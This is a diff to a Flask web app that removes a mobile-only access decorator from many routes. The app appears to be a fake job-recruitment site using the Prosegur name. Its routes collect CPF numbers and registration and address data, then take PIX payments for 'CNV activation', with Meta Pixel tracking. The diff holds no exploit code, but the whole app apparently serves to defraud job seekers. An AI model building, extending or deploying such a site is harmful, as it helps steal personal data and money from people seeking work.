@@ -16,7 +16,7 @@ from analytics import analytics_tracker
 from cache_manager import page_cache, api_cache
 from performance_optimizer import performance_optimizer, performance_monitor
 from heroku_optimizer import heroku_optimizer
-from simple_mobile_protection import simple_mobile_only
+# Mobile protection removed
 from meta_pixels import MetaPixelTracker
 
 # Initialize Meta Pixel tracker
@@ -69,19 +69,16 @@ def serve_font(filename):
     return send_from_directory('static/fonts', filename)
 
 @app.route("/")
-@simple_mobile_only
 @performance_monitor
 def index():
     return render_template("index.html")
 
 @app.route("/vagas")
-@simple_mobile_only
 @performance_monitor
 def vagas():
     return render_template("vagas.html")
 
 @app.route("/local")
-@simple_mobile_only
 @performance_monitor
 def local():
     return render_template("local.html")
@@ -165,7 +162,7 @@ def cleanup_old_sessions():
         health_monitor.log_error(f"Session cleanup error: {str(e)}", "before_request")
 
 @app.route("/api/consulta-cpf", methods=["POST"])
-@simple_mobile_only
+
 def consulta_cpf():
     try:
         data = request.get_json()
@@ -225,7 +222,7 @@ def consulta_cpf():
         return jsonify({"success": False, "error": "Serviço temporariamente indisponível"})
 
 @app.route("/loading", methods=["GET", "POST"])
-@simple_mobile_only
+
 def loading():
     if request.method == "POST":
         # Store form data in session for payment creation
@@ -247,7 +244,7 @@ def loading():
                          loading_time=loading_time)
 
 @app.route("/get_user_data")
-@simple_mobile_only
+
 def get_user_data():
     if not session.get('registration_data'):
         return jsonify({"error": "No data found"}), 404
@@ -268,7 +265,7 @@ def get_user_data():
     })
 
 @app.route("/address", methods=['GET', 'POST'])
-@simple_mobile_only
+
 def address():
     if request.method == 'POST':
         try:
@@ -311,7 +308,7 @@ def info():
     return render_template("info.html")
 
 @app.route("/submit_registration", methods=["POST"])
-@simple_mobile_only
+
 def submit_registration():
     try:
         data = request.form
@@ -718,7 +715,7 @@ def check_payment_status(transaction_id):
         return jsonify({"success": False, "error": str(e)})
 
 @app.route("/resultado/<status>")
-@simple_mobile_only
+
 def resultado(status):
     # Obter dados de registro da sessão ou criar dados básicos padrão
     registration_data = session.get('registration_data', {})
@@ -760,7 +757,7 @@ def resultado(status):
                           now=current_date)
 
 @app.route("/agendamento")
-@simple_mobile_only
+
 def agendamento():
     return render_template("agendamento_fixed.html")
 
@@ -965,7 +962,7 @@ def get_hospital_info():
         })
 
 @app.route("/chat")
-@simple_mobile_only
+
 def chat():
     """Chat page for candidate interactions with Prosegur HR"""
     # Get user data from session
@@ -1260,13 +1257,13 @@ def api_analytics():
         return jsonify({"error": "Failed to get analytics data"}), 500
 
 @app.route('/login')
-@simple_mobile_only
+
 def login():
     """Login page for CNAS activation"""
     return render_template("login.html")
 
 @app.route('/aviso')
-@simple_mobile_only
+
 def aviso():
     """CNV Digital page"""
     # Get pixel IDs for template
@@ -1280,13 +1277,13 @@ def aviso():
                          pixel_event_data=pixel_event_data)
 
 @app.route('/finalizar')
-@simple_mobile_only
+
 def finalizar():
     """CNV Payment page with real PIX transaction"""
     return render_template('finalizar.html')
 
 @app.route('/create_cnv_payment', methods=['POST'])
-@simple_mobile_only
+
 def create_cnv_payment():
     """Create PIX payment for CNV activation"""
     try:
@@ -1343,7 +1340,7 @@ def create_cnv_payment():
         })
 
 @app.route('/check_cnv_payment_status/<payment_id>')
-@simple_mobile_only
+
 def check_cnv_payment_status(payment_id):
     """Check CNV PIX payment status"""
     try:
